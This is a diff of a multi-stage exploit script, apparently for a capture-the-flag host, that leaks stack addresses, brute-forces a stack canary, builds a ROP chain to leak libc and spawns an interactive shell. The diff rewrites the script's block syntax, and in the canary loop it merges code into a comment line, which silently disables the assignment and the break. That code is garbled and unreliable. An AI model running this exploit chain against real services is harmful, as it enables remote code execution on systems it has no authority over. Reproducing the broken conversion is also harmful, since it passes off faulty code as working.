@@ -1,4 +1,4 @@
-# Multi-stage exploitation - chaining multiple vulns
+﻿# Multi-stage exploitation - chaining multiple vulns
 # Realistic CTF scenario with multiple steps
 
 let host = "multi.pwn.ctf"
@@ -27,10 +27,8 @@ let stack_leak = recv_until(conn, "\n")
 let leaked_addrs = split(stack_leak, ".")
 
 print("[+] Leaked stack addresses:")
-for addr in leaked_addrs
-    print("   ", addr)
-end
-
+for addr in leaked_addrs {    print("   ", addr)
+}
 # Extract useful addresses
 let stack_addr = int(leaked_addrs[0], 16)
 let code_addr = int(leaked_addrs[3], 16)
@@ -62,18 +60,12 @@ define function leak_canary()
             send(conn, payload)
             let response = recv(conn, 1024, timeout: 1)
             
-            if "Error" not in str(response)
-                # Correct byte, server didn't crash
-                canary = canary + [guess]
-                print("[+] Canary byte", byte_pos, ":", hex(guess))
-                break
-            end
-        end
-    end
-    
+            if "Error" not in str(response) {                # Correct byte, server didn't crash {                canary = canary + [guess] {                print("[+] Canary byte", byte_pos, ":", hex(guess)) {                break
+            }
+        }
+    }
     return canary
-end
-
+}
 let canary = leak_canary()
 print("[+] Full canary:", hex(canary))
 
@@ -113,10 +105,8 @@ payload = payload + bytes(canary)
 payload = payload + "B" * 8  # Saved RBP
 
 # Add ROP chain
-for gadget in leak_chain
-    payload = payload + p64(gadget)
-end
-
+for gadget in leak_chain {    payload = payload + p64(gadget)
+}
 send(conn, payload)
 
 # Receive libc leak
@@ -161,9 +151,7 @@ print("[+] Dropping to interactive shell...")
 send(conn, "id\n")
 let shell_check = recv(conn, 1024)
 
-if "uid=" in str(shell_check)
-    print("[+] SUCCESS! Got shell!")
+if "uid=" in str(shell_check) {    print("[+] SUCCESS! Got shell!")
     interactive(conn)
-else
-    print("[-] Shell failed, debugging required")
-end
+} else {    print("[-] Shell failed, debugging required")
+}
